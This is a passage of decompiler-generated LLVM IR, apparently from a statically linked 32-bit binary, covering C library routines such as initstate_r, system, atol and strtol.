  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16fe8 = load i32, i32* @r4, align 4
  store i32 %v3_16fe8, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_17008, label %dec_label_pc_16ff8

dec_label_pc_16ff8:                               ; preds = %entry
  %v2_16ff8 = icmp ugt i32 %arg2, 254
  %v7_16ff8 = icmp eq i32 %arg2, 255
  %v2_16ffc = xor i1 %v7_16ff8, true
  %v3_16ffc = and i1 %v2_16ff8, %v2_16ffc
  br i1 %v3_16ffc, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_16ff8
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16ff8, %bb
  %v1_170307 = phi i32 [ %v3_16fe8, %dec_label_pc_16ff8 ], [ 4, %bb ]
  %v2_17000 = xor i1 %v2_16ff8, true
  %v3_17000 = or i1 %v7_16ff8, %v2_17000
  br i1 %v3_17000, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_17008:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_17020, label %dec_label_pc_17010

dec_label_pc_17010:                               ; preds = %dec_label_pc_17008
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_1708c

.thread10:                                        ; preds = %dec_label_pc_17010
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_17020:                               ; preds = %dec_label_pc_17008
  %v2_17020 = icmp ugt i32 %arg2, 62
  %v7_17020 = icmp eq i32 %arg2, 63
  %v2_17024 = xor i1 %v7_17020, true
  %v3_17024 = and i1 %v2_17020, %v2_17024
  br i1 %v3_17024, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_17020
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_17020, %bb22
  %v1_170306 = phi i32 [ %v3_16fe8, %dec_label_pc_17020 ], [ 2, %bb22 ]
  %v2_17028 = xor i1 %v2_17020, true
  %v3_17028 = or i1 %v7_17020, %v2_17028
  br i1 %v3_17028, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_17038 = phi i32 [ 3, %bb21 ], [ %v1_170307, %bb20 ], [ %v1_170306, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_202d8.1041 to i32), i32* %r2.global-to-local, align 4
  %v4_17030 = mul i32 %v1_17038, 4
  %v5_17030 = add i32 %v4_17030, ptrtoint (i32* @global_var_202d8.1041 to i32)
  store i32 %v5_17030, i32* %r3.global-to-local, align 4
  %v1_17034 = add i32 %v4_17030, add (i32 ptrtoint (i32* @global_var_202d8.1041 to i32), i32 20)
  %v2_17034 = inttoptr i32 %v1_17034 to i32*
  %v3_17034 = load i32, i32* %v2_17034, align 4
  store i32 %v3_17034, i32* %r1.global-to-local, align 4
  %v6_17038 = inttoptr i32 %v5_17030 to i32*
  %v7_17038 = load i32, i32* %v6_17038, align 4
  store i32 %v7_17038, i32* %r2.global-to-local, align 4
  %v1_1703c = add i32 %tmp, 4
  store i32 %v1_1703c, i32* @r6, align 4
  %v4_17040 = mul i32 %v3_17034, 4
  %v5_17040 = add i32 %v4_17040, %v1_1703c
  store i32 %v5_17040, i32* %r3.global-to-local, align 4
  %v2_17044 = add i32 %arg3, 24
  %v3_17044 = inttoptr i32 %v2_17044 to i32*
  store i32 %v5_17040, i32* %v3_17044, align 4
  %v0_17048 = load i32, i32* %r2.global-to-local, align 4
  %v1_17048 = load i32, i32* @r5, align 4
  %v2_17048 = add i32 %v1_17048, 20
  %v3_17048 = inttoptr i32 %v2_17048 to i32*
  store i32 %v0_17048, i32* %v3_17048, align 4
  %v0_1704c = load i32, i32* %r1.global-to-local, align 4
  %v1_1704c = load i32, i32* @r5, align 4
  %v2_1704c = add i32 %v1_1704c, 16
  %v3_1704c = inttoptr i32 %v2_1704c to i32*
  store i32 %v0_1704c, i32* %v3_1704c, align 4
  %v0_17050 = load i32, i32* @r4, align 4
  %v1_17050 = load i32, i32* @r5, align 4
  %v2_17050 = add i32 %v1_17050, 12
  %v3_17050 = inttoptr i32 %v2_17050 to i32*
  store i32 %v0_17050, i32* %v3_17050, align 4
  %v0_17054 = load i32, i32* @r6, align 4
  %v1_17054 = load i32, i32* @r5, align 4
  %v2_17054 = add i32 %v1_17054, 8
  %v3_17054 = inttoptr i32 %v2_17054 to i32*
  store i32 %v0_17054, i32* %v3_17054, align 4
  %v0_17058 = load i32, i32* @r5, align 4
  store i32 %v0_17058, i32* %r1.global-to-local, align 4
  %v0_1705c = load i32, i32* @r0, align 4
  %v2_1705c = inttoptr i32 %v0_1705c to i32*
  %v3_1705c = call i32 @srandom_r(i32* %v2_1705c, i32 %v0_17058)
  store i32 %v3_1705c, i32* %r0.global-to-local, align 4
  %v0_17060 = load i32, i32* @r4, align 4
  %v2_17060 = icmp eq i32 %v0_17060, 0
  br i1 %v2_17060, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1707c12 = load i32, i32* @r7, align 4
  %v2_1707c13 = inttoptr i32 %v1_1707c12 to i32*
  store i32 0, i32* %v2_1707c13, align 4
  %v1_17080 = load i32, i32* @r4, align 4
  store i32 %v1_17080, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_17064 = load i32, i32* @r5, align 4
  %v2_17064 = add i32 %v1_17064, 4
  %v3_17064 = inttoptr i32 %v2_17064 to i32*
  %v4_17064 = load i32, i32* %v3_17064, align 4
  %v1_17068 = load i32, i32* @r6, align 4
  %v3_17068 = sub i32 %v4_17064, %v1_17068
  %v4_1706c = sdiv i32 %v3_17068, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_17074 = mul i32 %v4_1706c, 5
  %v5_17074 = add i32 %v4_17074, %v0_17060
  store i32 %v5_17074, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1707c = load i32, i32* @r7, align 4
  %v2_1707c = inttoptr i32 %v1_1707c to i32*
  store i32 0, i32* %v2_1707c, align 4
  %v1_17084 = load i32, i32* %r3.global-to-local, align 4
  %v2_17084 = load i32, i32* @r7, align 4
  %v3_17084 = inttoptr i32 %v2_17084 to i32*
  store i32 %v1_17084, i32* %v3_17084, align 4
  %v17_17088.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_17088 = phi i32 [ %v1_17080, %bb26 ], [ %v17_17088.pre, %.thread4 ]
  %v2_17088 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17088, i32* %r4.global-to-local, align 4
  ret i32 %v17_17088

dec_label_pc_1708c:                               ; preds = %dec_label_pc_17010
  %v0_1708c = call i32 @__errno_location()
  store i32 %v0_1708c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_17094 = inttoptr i32 %v0_1708c to i32*
  store i32 22, i32* %v2_17094, align 4
  %v0_17098 = call i32 @__errno_location()
  %v0_1709c = load i32, i32* %r4.global-to-local, align 4
  %v2_1709c = inttoptr i32 %v0_17098 to i32*
  store i32 %v0_1709c, i32* %v2_1709c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_170a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_170a4, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_17020, { 1, 0 }
  uselistorder i1 %v7_16ff8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_202d8.1041 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_202d8.1041 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_170ac = load i32, i32* @r4, align 4
  %v0_170b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_170b0 = icmp eq i32 %v0_170b0, 0
  br i1 %v2_170b0, label %bb, label %dec_label_pc_170c4

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171d0

dec_label_pc_170c4:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_170cc = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_170dc = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_170ec = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_170ec, i32* %r0.global-to-local, align 4
  %v0_170f4 = call i32 @__vfork()
  store i32 %v0_170f4, i32* %r0.global-to-local, align 4
  store i32 %v0_170f4, i32* @r4, align 4
  %v1_170f8 = icmp slt i32 %v0_170f4, 0
  br i1 %v1_170f8, label %dec_label_pc_17100, label %dec_label_pc_1712c

dec_label_pc_17100:                               ; preds = %dec_label_pc_170c4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_17108 = call i32 @__bsd_signal(i32 3, i32 %v2_170cc)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17114 = call i32 @__bsd_signal(i32 2, i32 %v2_170dc)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17120 = call i32 @__bsd_signal(i32 17, i32 %v2_170ec)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171d0

dec_label_pc_1712c:                               ; preds = %dec_label_pc_170c4
  %v2_170f8 = icmp eq i32 %v0_170f4, 0
  br i1 %v2_170f8, label %dec_label_pc_17130, label %dec_label_pc_17174

dec_label_pc_17130:                               ; preds = %dec_label_pc_1712c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_17138 = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_1713c = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17144 = call i32 @__bsd_signal(i32 2, i32 %v0_1713c)
  %v0_17148 = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17150 = call i32 @__bsd_signal(i32 17, i32 %v0_17148)
  store i32 ptrtoint ([8 x i8]* @global_var_20300.1049 to i32), i32* %r0.global-to-local, align 4
  %v0_17164 = load i32, i32* @r4, align 4
  %v8_17168 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_20300.1049 to i32), i32 ptrtoint ([3 x i8]* @global_var_20308.1051 to i32), i32 ptrtoint ([3 x i8]* @global_var_2030c.1053 to i32), i32 %v0_170b0, i32 %v0_17164)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_17170 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_17174:                               ; preds = %dec_label_pc_1712c
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1717c = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17188 = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_17198 = load i32, i32* @r4, align 4
  store i32 %v0_17198, i32* %r0.global-to-local, align 4
  %v0_1719c = call i32 @wait4()
  store i32 %v0_1719c, i32* %r0.global-to-local, align 4
  %v7_171a0 = icmp eq i32 %v0_1719c, -1
  br i1 %v7_171a0, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_17174
  store i32 %v0_1719c, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_17174, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_171b0 = call i32 @__bsd_signal(i32 3, i32 %v2_170cc)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_171bc = call i32 @__bsd_signal(i32 2, i32 %v2_170dc)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_171c8 = call i32 @__bsd_signal(i32 17, i32 %v2_170ec)
  %v3_171cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_171cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_171d0

dec_label_pc_171d0:                               ; preds = %bb, %dec_label_pc_17100, %bb11
  %v8_171d4 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_17100 ], [ %v3_171cc, %bb11 ]
  store i32 %v3_170ac, i32* @r4, align 4
  ret i32 %v8_171d4

; uselistorder directives
  uselistorder i32 %v0_1719c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 11, 10, 12, 13, 14, 16, 15, 17, 18, 19, 21, 20, 22, 23, 24, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_171d0, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_171ec = call i32 @strtol()
  ret i32 %v0_171ec
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_171f4 = call i32 @_stdlib_strto_l()
  ret i32 %v0_171f4
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_171f8 = load i32, i32* @r4, align 4
  store i32 %v3_171f8, i32* %stack_var_-36, align 4
  %v0_171fc = load i32, i32* @r1, align 4
  store i32 %v0_171fc, i32* %sb.global-to-local, align 4
  %v0_17200 = load i32, i32* @r2, align 4
  store i32 %v0_17200, i32* %r5.global-to-local, align 4
  %v0_17204 = load i32, i32* @r3, align 4
  store i32 %v0_17204, i32* %fp.global-to-local, align 4
  %v0_17208 = load i32, i32* @r0, align 4
  %v2_1721c.pre = load i32, i32* @global_var_288c8, align 4
  br label %dec_label_pc_17214

dec_label_pc_17214:                               ; preds = %dec_label_pc_17214, %entry
  %v0_1724c = phi i32 [ %v0_17208, %entry ], [ %v1_17210, %dec_label_pc_17214 ]
  store i32 %v0_1724c, i32* %r4.global-to-local, align 4
  %v1_17218 = inttoptr i32 %v0_1724c to i8*
  %v2_17218 = load i8, i8* %v1_17218, align 1
  %v3_17218 = zext i8 %v2_17218 to i32
  %v3_17220 = mul nuw nsw i32 %v3_17218, 2
  %v4_17220 = add i32 %v3_17220, %v2_1721c.pre
  %v5_17220 = inttoptr i32 %v4_17220 to i8*
  %v6_17220 = load i8, i8* %v5_17220, align 1
  %v1_17224 = and i8 %v6_17220, 32
  %v2_17224 = icmp eq i8 %v1_17224, 0
  %v1_17210 = add i32 %v0_1724c, 1
  br i1 %v2_17224, label %dec_label_pc_1722c, label %dec_label_pc_17214

dec_label_pc_1722c:                               ; preds = %dec_label_pc_17214
  %v7_1722c = icmp eq i8 %v2_17218, 43
  br i1 %v7_1722c, label %dec_label_pc_1724c, label %dec_label_pc_17234

dec_label_pc_17234:                               ; preds = %dec_label_pc_1722c
  %v7_17234 = icmp eq i8 %v2_17218, 45
  br i1 %v7_17234, label %dec_label_pc_1724c, label %bb

bb:                                               ; preds = %dec_label_pc_17234
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17250

dec_label_pc_1724c:                               ; preds = %dec_label_pc_1722c, %dec_label_pc_17234
  %storemerge43 = phi i32 [ 1, %dec_label_pc_17234 ], [ 0, %dec_label_pc_1722c ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_17210, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17250

dec_label_pc_17250:                               ; preds = %bb, %dec_label_pc_1724c
  %v0_17270 = phi i32 [ %v0_1724c, %bb ], [ %v1_17210, %dec_label_pc_1724c ]
  %v1_17250 = and i32 %v0_17200, -17
  %v3_17250 = icmp eq i32 %v1_17250, 0
  br i1 %v3_17250, label %dec_label_pc_1725c, label %bb54

bb54:                                             ; preds = %dec_label_pc_17250
  br label %bb58

dec_label_pc_1725c:                               ; preds = %dec_label_pc_17250
  %v1_1725c = inttoptr i32 %v0_17270 to i8*
  %v2_1725c = load i8, i8* %v1_1725c, align 1
  %v7_17260 = icmp eq i8 %v2_1725c, 48
  %v1_17264 = add i32 %v0_17200, 10
  store i32 %v1_17264, i32* %r5.global-to-local, align 4
  br i1 %v7_17260, label %dec_label_pc_17270, label %bb55

bb55:                                             ; preds = %dec_label_pc_1725c
  br label %.thread8

dec_label_pc_17270:                               ; preds = %dec_label_pc_1725c
  %v1_17270 = add i32 %v0_17270, 1
  %v2_17270 = inttoptr i32 %v1_17270 to i8*
  %v3_17270 = load i8, i8* %v2_17270, align 1
  %v4_17270 = zext i8 %v3_17270 to i32
  store i32 %v1_17270, i32* %r4.global-to-local, align 4
  %v1_17274 = or i32 %v4_17270, 32
  %v7_17278 = icmp eq i32 %v1_17274, 120
  %v1_1727c = add i32 %v0_17200, 8
  store i32 %v1_1727c, i32* %r5.global-to-local, align 4
  br i1 %v7_17278, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_17270
  %v3_17288 = mul i32 %v1_1727c, 2
  store i32 %v3_17288, i32* %r5.global-to-local, align 4
  %v2_1728c = add i32 %v0_17270, 2
  store i32 %v2_1728c, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17270, %bb55, %bb56
  %v1_1735028 = phi i32 [ %v0_17208, %bb55 ], [ %v1_17270, %bb56 ], [ %v1_17270, %dec_label_pc_17270 ]
  %v0_172d819 = phi i32 [ %v0_17270, %bb55 ], [ %v2_1728c, %bb56 ], [ %v1_17270, %dec_label_pc_17270 ]
  %v0_17290 = phi i32 [ %v1_17264, %bb55 ], [ %v3_17288, %bb56 ], [ %v1_1727c, %dec_label_pc_17270 ]
  %v5_17294 = icmp slt i32 %v0_17290, 16
  br i1 %v5_17294, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_1735027 = phi i32 [ %v0_17208, %bb54 ], [ %v1_1735028, %.thread8 ], [ %v1_1735028, %bb57 ]
  %v0_172d818 = phi i32 [ %v0_17270, %bb54 ], [ %v0_172d819, %.thread8 ], [ %v0_172d819, %bb57 ]
  %v0_172a8 = phi i32 [ %v0_17200, %bb54 ], [ %v0_17290, %.thread8 ], [ 16, %bb57 ]
  %v1_17298 = add i32 %v0_172a8, -2
  %tmp = icmp ugt i32 %v1_17298, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_172a8

.thread:                                          ; preds = %bb58
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1734c

dec_label_pc_172a8:                               ; preds = %bb58
  %v2_172b0 = urem i32 -1, %v0_172a8
  %v1_172c0 = urem i32 %v2_172b0, 256
  store i32 %v1_172c0, i32* %sl.global-to-local, align 4
  %v2_172c4 = udiv i32 -1, %v0_172a8
  store i32 0, i32* @ip, align 4
  store i32 %v2_172c4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_172d8

dec_label_pc_172d4:                               ; preds = %bb65, %dec_label_pc_17334
  %v0_172d4 = phi i32 [ %v1_17304, %bb65 ], [ %v0_172d4.pre, %dec_label_pc_17334 ]
  br label %dec_label_pc_172d8

dec_label_pc_172d8:                               ; preds = %dec_label_pc_172a8, %dec_label_pc_172d4
  %v1_1735025 = phi i32 [ %v1_1735027, %dec_label_pc_172a8 ], [ %v0_172d4, %dec_label_pc_172d4 ]
  %v0_17304 = phi i32 [ %v0_172d818, %dec_label_pc_172a8 ], [ %v0_172d4, %dec_label_pc_172d4 ]
  %v1_172d8 = inttoptr i32 %v0_17304 to i8*
  %v2_172d8 = load i8, i8* %v1_172d8, align 1
  %v3_172d8 = zext i8 %v2_172d8 to i32
  %v1_172dc = add nsw i32 %v3_172d8, -48
  %v1_172e0 = urem i32 %v1_172dc, 256
  %v1_172e8 = or i32 %v3_172d8, 32
  %tmp73 = icmp ult i32 %v1_172e0, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_172f0

dec_label_pc_172f0:                               ; preds = %dec_label_pc_172d8
  %tmp74 = icmp ugt i32 %v1_172e8, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_172f0
  %v1_172f4 = add nsw i32 %v1_172e8, -87
  %v5_172fc = urem i32 %v1_172f4, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_172d8, %dec_label_pc_172f0, %bb59
  %v3_1732c = phi i32 [ %v1_172e0, %dec_label_pc_172d8 ], [ 40, %dec_label_pc_172f0 ], [ %v5_172fc, %bb59 ]
  %v1_17300 = load i32, i32* %r5.global-to-local, align 4
  %v1_17304 = add i32 %v0_17304, 1
  store i32 %v1_17304, i32* %r4.global-to-local, align 4
  %v6_17308 = icmp slt i32 %v3_1732c, %v1_17300
  br i1 %v6_17308, label %dec_label_pc_1730c, label %dec_label_pc_1734c.loopexit

dec_label_pc_1730c:                               ; preds = %bb60
  %v0_1730c = load i32, i32* @ip, align 4
  %v1_1730c = load i32, i32* %r8.global-to-local, align 4
  %v9_1730c = icmp eq i32 %v0_1730c, %v1_1730c
  br i1 %v9_1730c, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_1730c
  br label %dec_label_pc_1731c

bb61:                                             ; preds = %dec_label_pc_1730c
  %v3_1730c = icmp ult i32 %v0_1730c, %v1_1730c
  br i1 %v3_1730c, label %dec_label_pc_1731c, label %dec_label_pc_17334

dec_label_pc_1731c:                               ; preds = %bb61, %.thread37
  %v4_173242240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_1731c = load i32, i32* %sl.global-to-local, align 4
  %v3_1731c = icmp uge i32 %v3_1732c, %v1_1731c
  %v9_1731c = icmp eq i32 %v3_1732c, %v1_1731c
  %v2_17320 = xor i1 %v3_1731c, true
  %v3_17320 = or i1 %v9_1731c, %v2_17320
  br i1 %v3_17320, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1731c
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_1731c, %bb62
  %v4_17324 = phi i32 [ %v4_173242240, %dec_label_pc_1731c ], [ 0, %bb62 ]
  %v2_17324 = xor i1 %v9_1731c, true
  %v3_17324 = and i1 %v3_1731c, %v2_17324
  br i1 %v3_17324, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_17324 = urem i32 %v4_17324, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_17328 = phi i32 [ %v5_17324, %bb64 ], [ %v4_17324, %bb63 ]
  %v2_17328 = icmp eq i32 %v0_17328, 0
  br i1 %v2_17328, label %bb65, label %dec_label_pc_17334

bb65:                                             ; preds = %thread-pre-split
  %v4_1732c = mul i32 %v0_1730c, %v1_17300
  %v5_1732c = add i32 %v4_1732c, %v3_1732c
  store i32 %v5_1732c, i32* @ip, align 4
  br label %dec_label_pc_172d4

dec_label_pc_17334:                               ; preds = %bb61, %thread-pre-split
  %v0_17334 = call i32 @__errno_location()
  %v0_17338 = load i32, i32* %r7.global-to-local, align 4
  %v1_17338 = load i32, i32* %fp.global-to-local, align 4
  %v2_17338 = and i32 %v1_17338, %v0_17338
  store i32 %v2_17338, i32* %r7.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  %v2_17344 = inttoptr i32 %v0_17334 to i32*
  store i32 34, i32* %v2_17344, align 4
  %v0_172d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_172d4

dec_label_pc_1734c.loopexit:                      ; preds = %bb60
  %v0_1734c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1734c

dec_label_pc_1734c:                               ; preds = %.thread, %dec_label_pc_1734c.loopexit
  %v1_17350 = phi i32 [ %v1_1735025, %dec_label_pc_1734c.loopexit ], [ %v1_1735027, %.thread ]
  %v2_17350 = phi i32 [ %v0_1734c.pre, %dec_label_pc_1734c.loopexit ], [ %v0_171fc, %.thread ]
  %v2_1734c = icmp eq i32 %v2_17350, 0
  br i1 %v2_1734c, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_1734c
  %v3_17350 = inttoptr i32 %v2_17350 to i32*
  store i32 %v1_17350, i32* %v3_17350, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_1734c, %bb66
  %v0_17354 = load i32, i32* %r7.global-to-local, align 4
  %v2_17354 = icmp eq i32 %v0_17354, 0
  %. = select i1 %v2_17354, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_17360 = load i32, i32* %fp.global-to-local, align 4
  %v2_17360 = icmp eq i32 %v0_17360, 0
  %v0_17384.pre.pre = load i32, i32* @ip, align 4
  br i1 %v2_17360, label %dec_label_pc_1737c, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_17384.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_1736c, label %dec_label_pc_1737c

dec_label_pc_1736c:                               ; preds = %bb70
  %v0_1736c = call i32 @__errno_location()
  %v2_17374 = inttoptr i32 %v0_1736c to i32*
  store i32 34, i32* %v2_17374, align 4
  %v0_17378 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_17378, i32* @ip, align 4
  %v0_1737c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1737c

dec_label_pc_1737c:                               ; preds = %bb70, %bb67, %dec_label_pc_1736c
  %v0_17384.pre = phi i32 [ %v0_17384.pre.pre, %bb70 ], [ %v0_17378, %dec_label_pc_1736c ], [ %v0_17384.pre.pre, %bb67 ]
  %v0_1737c = phi i32 [ %v0_17354, %bb70 ], [ %v0_1737c.pre, %dec_label_pc_1736c ], [ %v0_17354, %bb67 ]
  %v2_1737c = icmp eq i32 %v0_1737c, 0
  br i1 %v2_1737c, label %dec_label_pc_1737c._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_1737c
  %v2_17380 = sub i32 0, %v0_17384.pre
  store i32 %v2_17380, i32* @ip, align 4
  br label %dec_label_pc_1737c._crit_edge

dec_label_pc_1737c._crit_edge:                    ; preds = %dec_label_pc_1737c, %bb71
  %v0_17384 = phi i32 [ %v2_17380, %bb71 ], [ %v0_17384.pre, %dec_label_pc_1737c ]
  %v2_17388 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_17388, i32* @r4, align 4
  ret i32 %v0_17384

; uselistorder directives
  uselistorder i32 %v0_17384.pre, { 1, 0 }
  uselistorder i32 %v0_17384.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_17324, { 1, 0 }
  uselistorder i1 %v3_1731c, { 1, 0 }
  uselistorder i32 %v1_1731c, { 1, 0 }
  uselistorder i32 %v1_17304, { 1, 0 }
  uselistorder i32 %v1_172e8, { 1, 0 }
  uselistorder i32 %v1_172e0, { 1, 0 }
  uselistorder i32 %v0_172d4, { 1, 0 }
  uselistorder i32 %v0_172a8, { 1, 0, 2 }
  uselistorder i32 %v3_17288, { 1, 0 }
  uselistorder i32 %v1_1727c, { 1, 0, 2 }
  uselistorder i32 %v0_17270, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_17210, { 1, 0, 2 }
  uselistorder i32 %v0_17208, { 1, 0, 2 }
  uselistorder i32 %v0_17200, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 7, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1737c._crit_edge, { 1, 0 }
